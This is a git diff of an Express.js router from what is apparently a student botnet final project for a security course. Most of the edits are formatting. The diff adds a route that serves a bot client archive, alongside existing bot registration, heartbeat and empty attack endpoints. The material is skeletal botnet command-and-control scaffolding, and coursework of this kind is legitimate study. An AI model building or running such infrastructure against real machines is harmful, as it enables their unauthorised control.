@@ -17,7 +17,7 @@ function middleware(req, res, next) {
 function router() {
   routes.use(middleware)
 
-  async function admin (req, res) {
+  async function admin(req, res) {
     try {
       var botsArray = bots.getBots()
       res.render('admin', {
@@ -29,11 +29,11 @@ function router() {
     }
   }
 
-  async function sendFile (res,res) {
-    // res.sendFile()
+  async function sendFile(res, res) {
+    res.sendFile("/Users/matthewrusczyk/dev/security/CS492_finalproject_botnet/client.tar.gz");
   }
 
-  async function landing (req, res) {
+  async function landing(req, res) {
     const bot = req.body
     try {
       if (Object.keys(bot).length !== 0) {
@@ -43,25 +43,25 @@ function router() {
         } else {
           res.send('Bot already exists')
         }
-      }else {
+      } else {
         res.send('Did not recieve a bot in payload')
       }
     } catch (error) {
-      console.log(error) 
+      console.log(error)
     }
   }
 
-  async function attack (req, res) {
-    
+  async function attack(req, res) {
+
   }
 
-  async function heartbeat (req, res) {
+  async function heartbeat(req, res) {
     debug('HEARTBEAT')
     const { ip } = req.params
     try {
       var response = await bots.heartbeat(ip)
       if (response) {
-        res.sendStatus(200)      
+        res.sendStatus(200)
       } else {
         res.send('Bot does not exist yet')
       }
@@ -76,6 +76,7 @@ function router() {
   routes.post('/landing', landing)
   routes.get('/attack', attack)
   routes.get('/heartbeat/:ip', heartbeat)
+  routes.get('/sendFile', sendFile)
 
   return routes
 }
